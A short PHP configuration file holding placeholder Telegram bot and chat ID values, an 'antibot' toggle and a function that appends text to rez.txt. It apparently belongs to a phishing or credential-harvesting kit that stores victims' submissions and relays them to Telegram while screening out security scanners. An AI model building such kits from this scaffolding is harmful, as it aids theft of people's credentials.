<?php

     

$bot = "your-token";
$chat_id = "chatid";


// use antibot? yes|no
$antibot = "yes";

 
function save($txt){
    $fp = fopen((__DIR__)."/rez.txt", "a");
    fwrite($fp, $txt);
    fclose($fp);
}




?>